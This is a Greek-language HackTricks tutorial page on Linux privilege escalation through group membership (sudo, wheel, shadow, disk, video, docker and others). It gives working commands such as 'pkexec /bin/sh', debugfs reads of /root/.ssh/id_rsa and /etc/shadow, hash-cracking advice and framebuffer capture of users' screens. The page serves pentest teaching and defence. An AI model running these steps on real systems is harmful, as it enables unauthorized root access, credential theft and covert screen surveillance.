{{#include ../../banners/hacktricks-training.md}}

# Sudo/Διαχειριστικά Γκρουπ

## **PE - Μέθοδος 1**

**Μερικές φορές**, **κατά προεπιλογή \(ή επειδή κάποια λογισμικά το χρειάζονται\)** μέσα στο **/etc/sudoers** αρχείο μπορείτε να βρείτε μερικές από αυτές τις γραμμές:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για **να γίνεις root μπορείς απλά να εκτελέσεις**:
```text
sudo su
```
## PE - Μέθοδος 2

Βρείτε όλα τα suid δυαδικά και ελέγξτε αν υπάρχει το δυαδικό **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Αν διαπιστώσετε ότι το δυαδικό αρχείο pkexec είναι SUID δυαδικό και ανήκετε σε sudo ή admin, πιθανόν να μπορείτε να εκτελέσετε δυαδικά αρχεία ως sudo χρησιμοποιώντας το pkexec. Ελέγξτε τα περιεχόμενα του:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Εκεί θα βρείτε ποιες ομάδες επιτρέπεται να εκτελούν **pkexec** και **κατά προεπιλογή** σε ορισμένα linux μπορεί **να εμφανιστούν** κάποιες από τις ομάδες **sudo ή admin**.

Για **να γίνετε root μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Αν προσπαθήσετε να εκτελέσετε **pkexec** και λάβετε αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Δεν είναι επειδή δεν έχετε άδειες, αλλά επειδή δεν είστε συνδεδεμένοι χωρίς GUI**. Και υπάρχει μια λύση για αυτό το πρόβλημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 διαφορετικές ssh συνεδρίες**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**Μερικές φορές**, **κατά προεπιλογή** μέσα στο **/etc/sudoers** αρχείο μπορείτε να βρείτε αυτή τη γραμμή:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα wheel μπορεί να εκτελεί οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για **να γίνεις root μπορείς απλά να εκτελέσεις**:
```text
sudo su
```
# Shadow Group

Χρήστες από την **ομάδα shadow** μπορούν να **διαβάσουν** το **/etc/shadow** αρχείο:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Έτσι, διαβάστε το αρχείο και προσπαθήστε να **σπάσετε μερικούς κατακερματισμούς**.

# Ομάδα Δίσκου

Αυτή η προνομιακή πρόσβαση είναι σχεδόν **ισοδύναμη με την πρόσβαση root** καθώς μπορείτε να έχετε πρόσβαση σε όλα τα δεδομένα μέσα στη μηχανή.

Αρχεία: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Σημειώστε ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **γράφετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να κάνετε:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ωστόσο, αν προσπαθήσετε να **γράψετε αρχεία που ανήκουν στον root** \(όπως το `/etc/shadow` ή το `/etc/passwd`\) θα λάβετε ένα σφάλμα "**Permission denied**".

# Video Group

Χρησιμοποιώντας την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει μια έξοδο όπως η παρακάτω:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι συνδεδεμένος φυσικά** σε ένα τερματικό στη μηχανή.

Η **ομάδα video** έχει πρόσβαση για να δει την έξοδο της οθόνης. Βασικά, μπορείτε να παρατηρήσετε τις οθόνες. Για να το κάνετε αυτό, πρέπει να **πάρτε την τρέχουσα εικόνα στην οθόνη** σε ακατέργαστα δεδομένα και να βρείτε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0` και μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Για να **ανοίξετε** την **ακατέργαστη εικόνα** μπορείτε να χρησιμοποιήσετε το **GIMP**, να επιλέξετε το αρχείο **`screen.raw`** και να επιλέξετε ως τύπο αρχείου **Raw image data**:

![](../../images/image%20%28208%29.png)

Στη συνέχεια, τροποποιήστε το Πλάτος και το Ύψος στις διαστάσεις που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικούς Τύπους Εικόνας \(και επιλέξτε αυτόν που δείχνει καλύτερα την οθόνη\):

![](../../images/image%20%28295%29.png)

# Root Group

Φαίνεται ότι από προεπιλογή οι **μέλη της ομάδας root** θα μπορούσαν να έχουν πρόσβαση για **τροποποίηση** ορισμένων αρχείων ρυθμίσεων **υπηρεσιών** ή ορισμένων αρχείων **βιβλιοθηκών** ή **άλλων ενδιαφέροντων πραγμάτων** που θα μπορούσαν να χρησιμοποιηθούν για την κλιμάκωση δικαιωμάτων...

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη του root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

Μπορείτε να προσαρτήσετε το ριζικό σύστημα αρχείων της μηχανής-οικοδεσπότη σε έναν όγκο της παρουσίας, έτσι ώστε όταν η παρουσία ξεκινά, να φορτώνει αμέσως ένα `chroot` σε αυτόν τον όγκο. Αυτό σας δίνει ουσιαστικά δικαιώματα root στη μηχανή.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


{{#include ../../banners/hacktricks-training.md}}
